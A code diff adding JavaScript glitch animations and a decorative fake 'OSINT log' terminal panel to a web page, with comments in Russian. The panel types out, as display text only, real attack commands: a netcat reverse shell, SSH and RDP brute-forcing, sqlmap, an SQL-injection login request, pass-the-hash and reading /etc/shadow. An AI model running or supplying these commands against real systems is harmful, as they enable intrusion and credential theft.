+      { clipPath:'inset(20% 0 63% 0)', transform:`translate(${ri(-22,22)}px,0) skewX(${ri(-10,10)}deg)` },
+      { clipPath:'inset(37% 0 45% 0)', transform:`translate(${ri(-16,16)}px,0) skewX(${ri(-6,6)}deg)` },
+      { clipPath:'inset(55% 0 29% 0)', transform:`translate(${ri(-18,18)}px,0) skewX(${ri(-7,7)}deg)` },
+      { clipPath:'inset(71% 0 12% 0)', transform:`translate(${ri(-12,12)}px,0) skewX(${ri(-4,4)}deg)` },
+    ];
+    let i = 0;
+    (function step() {
+      if (!document.contains(el)) { active = false; return; }
+      if (i >= slices.length) { clear(el, done); return; }
+      const s = slices[i++];
+      set(el, { transform: s.transform, clipPath: s.clipPath, opacity: rnd(.05, .85), filter: a });
+      setTimeout(step, ri(20, 50));
+    })();
+  }
+
+  function flickerOut(el, done) {
+    const ticks = ri(6, 11);
+    let i = 0;
+    (function step() {
+      if (!document.contains(el)) { active = false; return; }
+      if (i >= ticks) { clear(el, done); return; }
+      const even = (i & 1) === 0;
+      const dx   = ri(-22, 22);
+      set(el, {
+        transform: `translate(${ri(-8,8)}px,${ri(-3,3)}px) skewX(${ri(-14,14)}deg)`,
+        opacity:   even ? rnd(.04, .10) : rnd(.80, 1.0),
+        filter:    `drop-shadow(${dx}px 0 rgba(255,0,40,${rnd(.70,1).toFixed(2)})) ` +
+                   `drop-shadow(${-dx}px 0 rgba(0,255,249,${rnd(.55,.90).toFixed(2)}))`,
+        clipPath:  (i === 0) ? `inset(${ri(22,46)}% 0 ${ri(22,46)}% 0)` : 'none',
+      });
+      i++;
+      setTimeout(step, ri(38, 80));
+    })();
+  }
+
+  const BURSTS = [crashTear, screenRip, flickerOut];
+
+  function loop() {
+    if (active) return;
+    const el = document.querySelector('.ws-3');
+    if (!el || !document.contains(el)) {
+      setTimeout(loop, 800);
+      return;
+    }
+    active = true;
+    BURSTS[ri(0, BURSTS.length)](el, () => {
+      setTimeout(loop, ri(1600, 2800));  /* чуть другой диапазон — десинхронизация с KIRIKO */
+    });
+  }
+
+  /* Старт со смещением от KIRIKO-глитча */
+  setTimeout(loop, 2000);
+})();
+
+/* ═════════════════════════════════════════════════════════
+   HEADER GLITCH — верхняя шапка
+   Сильный разрыв сети, синхронизирован с input-area.
+   ═════════════════════════════════════════════════════════ */
+(function() {
+  const el = document.querySelector('header');
+  if (!el) return;
+
+  let active = false;
+
+  function rnd(a, b) { return a + Math.random() * (b - a); }
+  function ri(a, b)  { return (rnd(a, b)) | 0; }
+
+  function set(s) {
+    el.style.transition = 'none';
+    el.style.transform  = s.transform  || '';
+    el.style.opacity    = s.opacity    !== undefined ? String(s.opacity) : '';
+    el.style.filter     = s.filter     || '';
+    el.style.clipPath   = s.clipPath   || '';
+  }
+
+  function clear(done) {
+    el.style.transform  = '';
+    el.style.opacity    = '';
+    el.style.filter     = '';
+    el.style.clipPath   = '';
+    el.style.transition = '';
+    active = false;
+    done();
+  }
+
+  function art(dx) {
+    return `drop-shadow(${-dx}px 0 rgba(255,0,40,1.0)) ` +
+           `drop-shadow(${dx}px 0 rgba(0,255,249,.62)) ` +
+           `drop-shadow(${-(dx*1.7)|0}px 0 rgba(255,0,0,.58))`;
+  }
+
+  /* ── crash-tear ── */
+  function crashTear(done) {
+    const seq = [
+      { transform:`translate(-26px,${ri(-3,4)}px) skewX(-26deg)`, opacity:.04, filter:art(26), clipPath:`inset(0 0 ${ri(40,65)}% 0)` },
+      { transform:`translate(20px,${ri(-2,3)}px)  skewX(18deg)`,  opacity:.70, filter:art(16), clipPath:`inset(${ri(10,28)}% 0 ${ri(32,55)}% 0)` },
+      { transform:`translate(-11px,1px) skewX(-9deg)`,             opacity:.44, filter:art(10), clipPath:`inset(${ri(35,55)}% 0 ${ri(10,28)}% 0)` },
+      { transform:`translate(6px,0)     skewX(3deg)`,              opacity:.86, filter:art(4),  clipPath:`inset(${ri(60,82)}% 0 0 0)` },
+      { transform:`translate(-2px,0)`,                             opacity:.97, filter:art(1),  clipPath:'none' },
+    ];
+    let i = 0;
+    (function step() {
+      if (i >= seq.length) { clear(done); return; }
+      set(seq[i++]);
+      setTimeout(step, ri(20, 48));
+    })();
+  }
+
+  /* ── screen-rip: горизонтальные полосы шапки ── */
+  function screenRip(done) {
+    const a = art(18);
+    const slices = [
+      { clipPath:'inset(0 0 78% 0)',   transform:`translate(${ri(-28,28)}px,0) skewX(${ri(-16,16)}deg)` },
+      { clipPath:'inset(22% 0 60% 0)', transform:`translate(${ri(-30,30)}px,0) skewX(${ri(-20,20)}deg)` },
+      { clipPath:'inset(40% 0 42% 0)', transform:`translate(${ri(-24,24)}px,0) skewX(${ri(-12,12)}deg)` },
+      { clipPath:'inset(58% 0 26% 0)', transform:`translate(${ri(-28,28)}px,0) skewX(${ri(-16,16)}deg)` },
+      { clipPath:'inset(75% 0 10% 0)', transform:`translate(${ri(-22,22)}px,0) skewX(${ri(-10,10)}deg)` },
+      { clipPath:'inset(88% 0 2% 0)',  transform:`translate(${ri(-26,26)}px,0) skewX(${ri(-14,14)}deg)` },
+    ];
+    let i = 0;
+    (function step() {
+      if (i >= slices.length) { clear(done); return; }
+      const s = slices[i++];
+      set({ transform: s.transform, clipPath: s.clipPath, opacity: rnd(.05, .88), filter: a });
+      setTimeout(step, ri(16, 42));
+    })();
+  }
+
+  /* ── flicker-out ── */
+  function flickerOut(done) {
+    const ticks = ri(8, 13);
+    let i = 0;
+    (function step() {
+      if (i >= ticks) { clear(done); return; }
+      const even = (i & 1) === 0;
+      const dx   = ri(-24, 24);
+      set({
+        transform: `translate(${ri(-14,14)}px,${ri(-2,2)}px) skewX(${ri(-18,18)}deg)`,
+        opacity:   even ? rnd(.03, .09) : rnd(.76, 1.0),
+        filter:    `drop-shadow(${dx}px 0 rgba(255,0,50,${rnd(.88,1.0).toFixed(2)})) ` +
+                   `drop-shadow(${-dx}px 0 rgba(0,255,249,${rnd(.48,.78).toFixed(2)})) ` +
+                   `drop-shadow(${ri(-14,14)}px 0 rgba(255,0,0,.72))`,
+        clipPath:  i === 0
+          ? `inset(${ri(8,36)}% 0 ${ri(8,36)}% 0)`
+          : (i % 3 === 0 ? `inset(${ri(0,28)}% 0 ${ri(0,28)}% 0)` : 'none'),
+      });
+      i++;
+      setTimeout(step, ri(26, 58));
+    })();
+  }
+
+  /* ── red-scan: алая полоса прорезает шапку ── */
+  function redScan(done) {
+    const ticks = ri(5, 9);
+    let i = 0;
+    (function step() {
+      if (i >= ticks) { clear(done); return; }
+      const top = ri(0, 55);
+      const bot = ri(5, 40);
+      const dx  = ri(-26, 26);
+      set({
+        transform: `translate(${dx}px, ${ri(-1,2)}px) skewX(${ri(-24, 24)}deg)`,
+        opacity:   rnd(.12, .85),
+        filter:    `drop-shadow(${ri(-26,26)}px 0 rgba(255,0,0,1.0)) ` +
+                   `drop-shadow(0 0 10px rgba(255,0,60,.95)) ` +
+                   `drop-shadow(${ri(-10,10)}px 0 rgba(0,255,249,.38))`,
+        clipPath:  `inset(${top}% 0 ${bot}% 0)`,
+      });
+      i++;
+      setTimeout(step, ri(20, 54));
+    })();
+  }
+
+  const BURSTS = [crashTear, screenRip, flickerOut, redScan, redScan];
+
+  function loop() {
+    if (active) return;
+    active = true;
+    BURSTS[ri(0, BURSTS.length)](() => {
+      setTimeout(loop, ri(1500, 3500));
+    });
+  }
+
+  /* Старт чуть позже input-area — десинхронизация */
+  setTimeout(loop, ri(1200, 2800));
+})();
+
+/* ═════════════════════════════════════════════════════════
+   INPUT AREA GLITCH — весь блок поисковой строки
+   "Помехи соединения" — работает всегда, в т.ч. при вводе.
+   Визуальный эффект, ввод текста не прерывается.
+   ═════════════════════════════════════════════════════════ */
+(function() {
+  const el = document.getElementById('input-area');
+  if (!el) return;
+
+  let active = false;
+
+  function rnd(a, b) { return a + Math.random() * (b - a); }
+  function ri(a, b)  { return (rnd(a, b)) | 0; }
+
+  function set(s) {
+    el.style.transition = 'none';
+    el.style.transform  = s.transform  || '';
+    el.style.opacity    = s.opacity    !== undefined ? String(s.opacity) : '';
+    el.style.filter     = s.filter     || '';
+    el.style.clipPath   = s.clipPath   || '';
+  }
+
+  function clear(done) {
+    el.style.transform  = '';
+    el.style.opacity    = '';
+    el.style.filter     = '';
+    el.style.clipPath   = '';
+    el.style.transition = '';
+    active = false;
+    done();
+  }
+
+  /* Тройной красный разрыв — основной артефакт */
+  function art(dx) {
+    return `drop-shadow(${-dx}px 0 rgba(255,0,40,1.0)) ` +
+           `drop-shadow(${dx}px 0 rgba(0,255,249,.65)) ` +
+           `drop-shadow(${-(dx*1.7)|0}px 0 rgba(255,0,0,.60))`;
+  }
+
+  /* ── crash-tear: сильный разрыв ── */
+  function crashTear(done) {
+    const seq = [
+      { transform:`translate(-28px,${ri(-4,5)}px) skewX(-28deg)`, opacity:.04, filter:art(28), clipPath:`inset(0 0 ${ri(42,70)}% 0)` },
+      { transform:`translate(22px,${ri(-2,4)}px)  skewX(20deg)`,  opacity:.72, filter:art(18), clipPath:`inset(${ri(10,26)}% 0 ${ri(34,55)}% 0)` },
+      { transform:`translate(-13px,1px) skewX(-10deg)`,            opacity:.45, filter:art(11), clipPath:`inset(${ri(36,55)}% 0 ${ri(10,26)}% 0)` },
+      { transform:`translate(7px,0)     skewX(4deg)`,              opacity:.88, filter:art(4),  clipPath:`inset(${ri(60,80)}% 0 0 0)` },
+      { transform:`translate(-3px,0)    skewX(-1deg)`,             opacity:.96, filter:art(1),  clipPath:'none' },
+    ];
+    let i = 0;
+    (function step() {
+      if (i >= seq.length) { clear(done); return; }
+      set(seq[i++]);
+      setTimeout(step, ri(22, 50));
+    })();
+  }
+
+  /* ── screen-rip: 6 горизонтальных полос с большим смещением ── */
+  function screenRip(done) {
+    const a = art(20);
+    const slices = [
+      { clipPath:'inset(0 0 80% 0)',   transform:`translate(${ri(-26,26)}px,0) skewX(${ri(-14,14)}deg)` },
+      { clipPath:'inset(20% 0 62% 0)', transform:`translate(${ri(-28,28)}px,0) skewX(${ri(-18,18)}deg)` },
+      { clipPath:'inset(38% 0 44% 0)', transform:`translate(${ri(-22,22)}px,0) skewX(${ri(-10,10)}deg)` },
+      { clipPath:'inset(55% 0 28% 0)', transform:`translate(${ri(-26,26)}px,0) skewX(${ri(-14,14)}deg)` },
+      { clipPath:'inset(72% 0 12% 0)', transform:`translate(${ri(-20,20)}px,0) skewX(${ri(-8,8)}deg)` },
+      { clipPath:'inset(85% 0 2% 0)',  transform:`translate(${ri(-24,24)}px,0) skewX(${ri(-12,12)}deg)` },
+    ];
+    let i = 0;
+    (function step() {
+      if (i >= slices.length) { clear(done); return; }
+      const s = slices[i++];
+      set({ transform: s.transform, clipPath: s.clipPath, opacity: rnd(.06, .90), filter: a });
+      setTimeout(step, ri(18, 44));
+    })();
+  }
+
+  /* ── flicker-out: много миганий с красным ── */
+  function flickerOut(done) {
+    const ticks = ri(8, 14);
+    let i = 0;
+    (function step() {
+      if (i >= ticks) { clear(done); return; }
+      const even = (i & 1) === 0;
+      const dx   = ri(-22, 22);
+      set({
+        transform: `translate(${ri(-12,12)}px,${ri(-3,3)}px) skewX(${ri(-16,16)}deg)`,
+        opacity:   even ? rnd(.03, .10) : rnd(.78, 1.0),
+        filter:    `drop-shadow(${dx}px 0 rgba(255,0,50,${rnd(.85,1.0).toFixed(2)})) ` +
+                   `drop-shadow(${-dx}px 0 rgba(0,255,249,${rnd(.50,.80).toFixed(2)})) ` +
+                   `drop-shadow(${ri(-12,12)}px 0 rgba(255,0,0,.75))`,
+        clipPath:  i === 0
+          ? `inset(${ri(10,38)}% 0 ${ri(10,38)}% 0)`
+          : (i % 3 === 0 ? `inset(${ri(0,28)}% 0 ${ri(0,28)}% 0)` : 'none'),
+      });
+      i++;
+      setTimeout(step, ri(28, 60));
+    })();
+  }
+
+  /* ── red-scan: алая горизонтальная полоса пронизывает блок ── */
+  function redScan(done) {
+    const ticks = ri(5, 9);
+    let i = 0;
+    (function step() {
+      if (i >= ticks) { clear(done); return; }
+      const top = ri(0, 60);
+      const bot = ri(5, 38);
+      const dx  = ri(-24, 24);
+      set({
+        transform: `translate(${dx}px, ${ri(-2,2)}px) skewX(${ri(-22, 22)}deg)`,
+        opacity:   rnd(.15, .88),
+        filter:    `drop-shadow(${ri(-24,24)}px 0 rgba(255,0,0,1.0)) ` +
+                   `drop-shadow(0 0 10px rgba(255,0,60,.95)) ` +
+                   `drop-shadow(${ri(-10,10)}px 0 rgba(0,255,249,.40))`,
+        clipPath:  `inset(${top}% 0 ${bot}% 0)`,
+      });
+      i++;
+      setTimeout(step, ri(22, 56));
+    })();
+  }
+
+  const BURSTS = [crashTear, screenRip, flickerOut, redScan, redScan]; /* redScan x2 = чаще */
+
+  function loop() {
+    if (active) return;
+    active = true;
+    BURSTS[ri(0, BURSTS.length)](() => {
+      /* 1.5–3.5с между ударами — нестабильное соединение */
+      setTimeout(loop, ri(1500, 3500));
+    });
+  }
+
+  /* Первый удар через 0.8–2с после загрузки */
+  setTimeout(loop, ri(800, 2000));
+})();
+
+/* ═════════════════════════════════════════════════════════
+   RIGHT-SIDE OSINT LOG — управляемый через window._osintLog
+   Старт/стоп синхронизированы с setLoading()
+   ═════════════════════════════════════════════════════════ */
+(function() {
+  const linesEl = document.getElementById('ol-lines');
+  const cmdEl   = document.getElementById('ol-cmd-text');
+  const pidEl   = document.getElementById('ol-pid');
+  if (!linesEl || !cmdEl) return;
+
+  const MAX_LINES = 80;  /* панель скроллится, держим историю */
+  let lineTimer = null;
+  let cmdTimer  = null;
+  let ci = 0;
+
+  function ts() {
+    const d = new Date();
+    return '[' + [d.getHours(), d.getMinutes(), d.getSeconds()]
+      .map(n => String(n).padStart(2,'0')).join(':') + ']';
+  }
+
+  /* [cssClass, bracket, text, boldValue] */
+  const POOL = [
+    ['ol-ok',  '[+]', 'геолокація визначена',         'Київ'],
+    ['ol-inf', '[*]', 'stream buffer',                 '185 KB'],
+    ['ol-err', '[!]', 'таймаут — активовано',          'failover'],
+    ['ol-inf', '[*]', 'keepalive',                     '44ms'],
+    ['ol-ok',  '[+]', 'сертифікат розпарсено',         'SHA-256/RSA-4096'],
+    ['ol-ok',  '[+]', 'open port',                     '443/tcp'],
+    ['ol-inf', '[*]', 'ssl handshake',                 'ok'],
+    ['ol-err', '[!]', 'rate limit — switching',        'proxy #3'],
+    ['ol-ok',  '[+]', 'dns resolved →',                '185.34.12.88'],
+    ['ol-inf', '[*]', 'packet loss',                   '0.2%'],
+    ['ol-ok',  '[+]', 'username found',                '@kaskocargo'],
+    ['ol-err', '[!]', 'honeypot detected —',           'rerouting'],
+    ['ol-inf', '[*]', 'fingerprint',                   'UA/mobile'],
+    ['ol-ok',  '[+]', 'whois parsed',                  'UA-NIC'],
+    ['ol-inf', '[*]', 'ttl',                           '128 hops'],
+    ['ol-ok',  '[+]', 'social graph',                  '+4 nodes'],
+    ['ol-err', '[!]', 'captcha — retry in',            '3s'],
+    ['ol-inf', '[*]', 'cipher',                        'AES-256-GCM'],
+    ['ol-ok',  '[+]', 'reverse lookup →',              'kyivstar.ua'],
+    ['ol-inf', '[*]', 'agent rotation',                'ok'],
+    ['ol-ok',  '[+]', 'hash cracked',                  'MD5→plain'],
+    ['ol-err', '[!]', 'firewall rule hit —',           'bypass ok'],
+    ['ol-inf', '[*]', 'latency',                       '38ms'],
+    ['ol-ok',  '[+]', 'module loaded',                 'shodan_v3'],
+    ['ol-ok',  '[+]', 'email leaked',                  'db_breach_2023'],
+    ['ol-inf', '[*]', 'bandwidth',                     '3.2 MB/s'],
+    ['ol-ok',  '[+]', 'cert issuer',                   "Let's Encrypt"],
+    ['ol-inf', '[*]', 'proxy chain',                   'RO→DE→NL'],
+    ['ol-ok',  '[+]', 'ASN found',                     'AS15895 Kyivstar'],
+    ['ol-inf', '[*]', 'cookies captured',              '14'],
+    ['ol-ok',  '[+]', 'exposed API key →',             'rotated'],
+    ['ol-err', '[!]', 'IDS alert —',                   'spoof active'],
+    ['ol-inf', '[*]', 'jitter',                        '±2ms'],
+    ['ol-ok',  '[+]', 'OSINT node resolved',           '+2 links'],
+    ['ol-ok',  '[+]', 'MAC vendor',                    'Huawei Tech.'],
+    ['ol-err', '[!]', 'auth token expired —',          'refresh ok'],
+    ['ol-inf', '[*]', 'geo confidence',                '94%'],
+    ['ol-ok',  '[+]', 'scraper page',                  '3/8 done'],
+    ['ol-dim', '[~]', 'cache flush...',                ''],
+    ['ol-dim', '[~]', 'rotating UA...',                ''],
+    ['ol-dim', '[~]', 'scanning ports',                '1-65535'],
+    ['ol-dim', '[~]', 'querying WHOIS...',             ''],
+    ['ol-dim', '[~]', 'loading module',                'osint_v2'],
+    ['ol-dim', '[~]', 'flushing session...',           ''],
+    ['ol-dim', '[~]', 'resolving hostname...',         ''],
+  ];
+
+  const CMDS = [
+    'nmap --script=vuln,exploit -sV -p- 185.34.12.88',
+    'sqlmap -u "http://185.34.12.88/api?id=0x3FF7" --dbs --batch --level=5',
+    'hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://185.34.12.88',
+    'python3 exploit.py --target 185.34.12.88 --port 8443 --shell',
+    './CVE-2024-1086.sh 185.34.12.88 --lhost 10.8.0.1 --lport 4444',
+    'msfconsole -x "use exploit/multi/handler; set LHOST 10.8.0.1; run"',
+    'hashcat -m 1000 -a 3 ntlm.hash ?u?l?l?l?d?d --force',
+    'john --wordlist=/usr/share/wordlists/rockyou.txt shadow.hash',
+    'nc -e /bin/bash 10.8.0.1 4444 &',
+    'curl -sk -X POST http://185.34.12.88/wp-admin --data "log=admin&pwd=\'+OR+1=1--"',
+    'gobuster dir -u http://185.34.12.88 -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt',
+    'nikto -h 185.34.12.88 -ssl -port 443 -Tuning 013',
+    'python3 -c "import pty;__import__(\'os\').system(\'/bin/bash -i\')"',
+    'ncrack -p 3389 --user admin -P pass.lst 185.34.12.88',
+    'responder -I eth0 -rdw --lm',
+    'evil-winrm -i 185.34.12.88 -u Administrator -H aad3b435b51404eeaad3b435b51404ee',
+    'crackmapexec smb 185.34.0.0/24 -u admin -p password --shares',
+    'cat /etc/shadow | awk -F: \'{print $1": "$2}\'',
+  ];
+
+  function addLine() {
+    const e   = POOL[Math.random() * POOL.length | 0];
+    const div = document.createElement('div');
+    div.className = 'ol-line';
+    div.innerHTML =
+      `<span class="ol-ts">${ts()}</span> ` +
+      `<span class="${e[0]}">${e[1]}</span> ` +
+      `<span class="ol-txt">${e[2]}</span>` +
+      (e[3] ? ` <span class="ol-val">${e[3]}</span>` : '');
+    linesEl.appendChild(div);
+    while (linesEl.children.length > MAX_LINES) linesEl.removeChild(linesEl.firstChild);
+  }
+
+  function startLines() {
+    if (lineTimer) return;
+    (function tick() {
+      addLine();
+      linesEl.scrollTop = linesEl.scrollHeight;
+      lineTimer = setTimeout(tick, 600 + (Math.random() * 1700 | 0));
+    })();
+  }
+
+  function stopLines() {
+    clearTimeout(lineTimer);
+    lineTimer = null;
+  }
+
+  /* Команда: печатает → "Enter" (добавляется в лог как исполненная) → мгновенная очистка → следующая */
+  function runCmd() {
+    const cmd = CMDS[ci++ % CMDS.length];
+    let i = 0;
+    function type() {
+      if (!cmdTimer) return;
+      cmdEl.textContent = cmd.slice(0, i);
+      if (i >= cmd.length) {
+        /* Команда напечатана — пауза как "нажали Enter" */
+        cmdTimer = setTimeout(execute, 400 + (Math.random() * 300 | 0));
+        return;
+      }
+      i++;
+      cmdTimer = setTimeout(type, 38 + (Math.random() * 52 | 0));
+    }
+    function execute() {
+      if (!cmdTimer) return;
+      /* Добавить в лог как исполненную команду */
+      const div = document.createElement('div');
+      div.className = 'ol-line ol-exec';
+      div.textContent = '$ ' + cmd;
+      linesEl.appendChild(div);
+      while (linesEl.children.length > MAX_LINES) linesEl.removeChild(linesEl.firstChild);
+      linesEl.scrollTop = linesEl.scrollHeight;
+      /* Мгновенно очистить строку ввода */
+      cmdEl.textContent = '';
+      /* Следующая команда через 800-2200ms */
+      cmdTimer = setTimeout(runCmd, 800 + (Math.random() * 1400 | 0));
+    }
+    type();
+  }
+
+  function startCmd() {
+    if (cmdTimer) return;
+    cmdTimer = setTimeout(runCmd, 600);
+  }
+
+  function stopCmd() {
+    clearTimeout(cmdTimer);
+    cmdTimer = null;
+    cmdEl.textContent = '';
+  }
+
+  const breachEl = document.getElementById('ol-breach');
+  let successTimer = null;
+
+  /* Публичный API — вызывается из setLoading() */
+/* ═════════════════════════════════════════════════════════
+   TERMINAL PANEL GLITCH — весь блок #osint-log
+   horror-уровень, только пока панель .active.
+   Цикл ~5.5 с — реже чем KIRIKO чтобы лог можно читать.
+   ═════════════════════════════════════════════════════════ */
+(function() {
+  const el = document.getElementById('osint-log');
+  if (!el) return;
+
+  let gActive = false;
+  let gTimer  = null;
+
+  function rnd(a, b) { return a + Math.random() * (b - a); }
+  function ri(a, b)  { return (rnd(a, b)) | 0; }
+
+  function applyS(s) {
+    el.style.transition = 'none';
+    el.style.transform  = s.transform  || '';
+    el.style.opacity    = s.opacity    !== undefined ? String(s.opacity) : '';
+    el.style.filter     = s.filter     || '';
+    el.style.clipPath   = s.clipPath   || '';
+  }
+
+  /* Inline стили пустые → каскад отдаёт управление .active → translateX(0) */
+  function resetEl(done) {
+    el.style.transform  = '';
+    el.style.opacity    = '';
+    el.style.filter     = '';
+    el.style.clipPath   = '';
+    el.style.transition = '';
+    gActive = false;
+    done();
+  }
+
+  function art(dx) {
+    return `drop-shadow(${-dx}px 0 rgba(255,0,60,.94)) drop-shadow(${dx}px 0 rgba(0,255,249,.94))`;
+  }
+
+  /* ── crash-tear: весь терминал рвёт влево + кадры восстановления ── */
+  function crashTear(done) {
+    const seq = [
+      { transform:`translate(-18px,${ri(-4,4)}px) skewX(-18deg)`, opacity:.05, filter:art(20), clipPath:`inset(0 0 ${ri(55,75)}% 0)` },
+      { transform:`translate(16px,${ri(-3,3)}px)  skewX(13deg)`,  opacity:.80, filter:art(12), clipPath:`inset(${ri(14,28)}% 0 ${ri(40,56)}% 0)` },
+      { transform:`translate(-10px,2px) skewX(-6deg)`,             opacity:.58, filter:art(7),  clipPath:`inset(${ri(40,54)}% 0 ${ri(16,30)}% 0)` },
+      { transform:`translate(5px,0)     skewX(3deg)`,              opacity:.92, filter:art(3),  clipPath:'none' },
+    ];
+    let i = 0;
+    (function step() {
+      if (!el.classList.contains('active')) { gActive = false; return; }
+      if (i >= seq.length) { resetEl(done); return; }
+      applyS(seq[i++]);
+      setTimeout(step, ri(30, 62));
+    })();
+  }
+
+  /* ── screen-rip: 5 горизонтальных полос блока на разных X ── */
+  function screenRip(done) {
+    const a = art(18);
+    const slices = [
+      { clipPath:'inset(0 0 80% 0)',    transform:`translate(${ri(-18,18)}px,0) skewX(${ri(-7,7)}deg)` },
+      { clipPath:'inset(20% 0 62% 0)', transform:`translate(${ri(-20,20)}px,0) skewX(${ri(-9,9)}deg)` },
+      { clipPath:'inset(38% 0 44% 0)', transform:`translate(${ri(-15,15)}px,0) skewX(${ri(-5,5)}deg)` },
+      { clipPath:'inset(56% 0 28% 0)', transform:`translate(${ri(-16,16)}px,0) skewX(${ri(-6,6)}deg)` },
+      { clipPath:'inset(72% 0 11% 0)', transform:`translate(${ri(-12,12)}px,0) skewX(${ri(-4,4)}deg)` },
+    ];
+    let i = 0;
+    (function step() {
+      if (!el.classList.contains('active')) { gActive = false; return; }
+      if (i >= slices.length) { resetEl(done); return; }
+      const s = slices[i++];
+      applyS({ transform: s.transform, clipPath: s.clipPath, opacity: rnd(.06, .86), filter: a });
+      setTimeout(step, ri(24, 54));
+    })();
+  }
+
+  /* ── flicker-out: мигание + хаотичный сдвиг всего блока ── */
+  function flickerOut(done) {
+    const ticks = ri(5, 10);
+    let i = 0;
+    (function step() {
+      if (!el.classList.contains('active')) { gActive = false; return; }
+      if (i >= ticks) { resetEl(done); return; }
+      const even = (i & 1) === 0;
+      const dx   = ri(-18, 18);
+      applyS({
+        transform: `translate(${ri(-8,8)}px,${ri(-3,3)}px) skewX(${ri(-10,10)}deg)`,
+        opacity:   even ? rnd(.05, .12) : rnd(.80, 1.0),
+        filter:    `drop-shadow(${dx}px 0 rgba(255,0,60,${rnd(.65,1).toFixed(2)})) ` +
+                   `drop-shadow(${-dx}px 0 rgba(0,255,249,${rnd(.65,1).toFixed(2)}))`,
+        clipPath:  i === 0 ? `inset(${ri(22,44)}% 0 ${ri(22,44)}% 0)` : 'none',
+      });
+      i++;
+      setTimeout(step, ri(36, 76));
+    })();
+  }
+
+  const BURSTS = [crashTear, screenRip, flickerOut];
+
+  function glitchLoop() {
+    if (!el.classList.contains('active')) return;
+    if (gActive) return;
+    gActive = true;
+    BURSTS[ri(0, BURSTS.length)](() => {
+      gTimer = setTimeout(glitchLoop, ri(3500, 7500));  /* avg ~5.5 с */
+    });
+  }
+
+  window._termGlitch = {
+    start() {
+      clearTimeout(gTimer);
+      gTimer = setTimeout(glitchLoop, ri(2500, 5000));   /* первый удар не сразу */
+    },
+    stop() {
+      clearTimeout(gTimer);
+      gTimer = null; gActive = false;
+      el.style.transform = ''; el.style.opacity = '';
+      el.style.filter = '';    el.style.clipPath = '';
+      el.style.transition = '';
+    }
+  };
+})();
+
+  window._osintLog = {
+    open() {
+      /* Отменяем отложенный BREACH если пришёл новый запрос */
+      clearTimeout(successTimer); successTimer = null;
+      pidEl.textContent = 'PID: ' + (4096 + (Math.random() * 28000 | 0));
+      linesEl.innerHTML = '';
+      cmdEl.textContent = '';
+      if (breachEl) breachEl.classList.remove('show');
+      for (let i = 0; i < 14; i++) addLine();
+      linesEl.scrollTop = linesEl.scrollHeight;
+      startLines();
+      startCmd();
+      if (window._termGlitch) window._termGlitch.start();
+    },
+    close() {
+      if (window._termGlitch) window._termGlitch.stop();
+      stopLines();
+      stopCmd();
+    },
+    success() {
+      /* Лог и команда останавливаются — глитч продолжается */
+      stopLines();
+      stopCmd();
+      const finals = [
+        ['ol-ok',  '[+]', 'extraction complete',  '100%'],
+        ['ol-ok',  '[+]', 'wiping access logs...',  ''],
+        ['ol-dim', '[~]', 'session terminated',     ''],
+      ];
+      let fi = 0;
+      (function addFinal() {
+        if (fi >= finals.length) {
+          /* BREACH показываем с задержкой 2.5с — отменяется если придёт новый запрос */
+          successTimer = setTimeout(() => {
+            if (breachEl) breachEl.classList.add('show');
+            linesEl.scrollTop = linesEl.scrollHeight;
+          }, 2500);
+          return;
+        }
+        const e = finals[fi++];
+        const div = document.createElement('div');
+        div.className = 'ol-line';
+        div.innerHTML =
+          `<span class="ol-ts">${ts()}</span> ` +
+          `<span class="${e[0]}">${e[1]}</span> ` +
+          `<span class="ol-txt">${e[2]}</span>` +
+          (e[3] ? ` <span class="ol-val">${e[3]}</span>` : '');
+        linesEl.appendChild(div);
+        linesEl.scrollTop = linesEl.scrollHeight;
+        setTimeout(addFinal, 300);
+      })();
+    }
+  };
+
+  /* Кнопка "Скрыть" — единственный способ закрыть панель */
+  const hideBtn = document.getElementById('ol-hide-btn');
+  if (hideBtn) {
+    hideBtn.addEventListener('click', () => {
+      const panel = document.getElementById('osint-log');
+      if (!panel) return;
+      if (window._termGlitch) window._termGlitch.stop();
+      stopLines();
+      stopCmd();
+      if (breachEl) breachEl.classList.remove('show');
+      panel.classList.remove('active');
+    });
+  }
+})();
+
+</script>
+</body>
+</html>
